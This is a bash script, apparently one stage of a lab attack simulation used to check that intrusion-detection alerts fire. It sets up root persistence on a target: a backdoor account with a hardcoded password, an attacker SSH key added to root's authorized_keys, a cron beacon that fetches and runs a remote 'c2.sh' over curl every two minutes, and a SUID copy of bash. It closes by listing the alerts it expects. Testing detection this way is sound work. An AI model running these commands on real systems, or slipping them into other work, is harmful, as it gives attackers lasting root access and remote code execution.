#!/usr/bin/env bash
# Stage 5 — persistence as root: backdoor account, root SSH key, cron
# beacon, SUID shell — then proof that the planted key actually works.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need ssh "openssh client"

check_target

say "creating a backdoor account"
root 'useradd -m -s /bin/bash backdoor'
root "echo 'backdoor:S3cr3tB4ckd00r' | chpasswd"

say "planting an SSH key for root"
KEY_DIR=$(cd "$(dirname "$0")" && pwd)/.keys
mkdir -p "$KEY_DIR"
KEY="$KEY_DIR/backdoor_ed25519"
[[ -f $KEY ]] || ssh-keygen -q -t ed25519 -N '' -C elmer-lab-attacker -f "$KEY"
root "mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '$(cat "$KEY.pub")' >> /root/.ssh/authorized_keys"

say "dropping a cron beacon (fires every 2 minutes)"
root "echo '*/2 * * * * root curl -s http://$HOST_IP:8000/c2.sh | bash' > /etc/cron.d/dbcheck"

say "installing a SUID shell"
root 'cp /bin/bash /tmp/rootsh && chmod u+s /tmp/rootsh'

say "logging in as root with the planted key"
ssh -i "$KEY" -o StrictHostKeyChecking=no "root@$TARGET" 'id; cat /root/flag.txt'

say "exercising the SUID shell as www-data"
rce '/tmp/rootsh -p -c id' | strip

note "expected on the target:"
note "  process    CRITICAL persist-useradd + auth 'user account created'"
note "  file       CRITICAL fim-auth-db (/etc/passwd), fim-ssh (authorized_keys)"
note "  file       HIGH     fim-persist (/etc/cron.d) + FIM events in /tmp, /home"
note "  process    HIGH     persist-chmod-suid on /tmp/rootsh"
note "  persistence         new account / cron / SUID in the next 5-minute sweep"
note "  process    HIGH     download-exec re-firing every 2 minutes (cron beacon)"
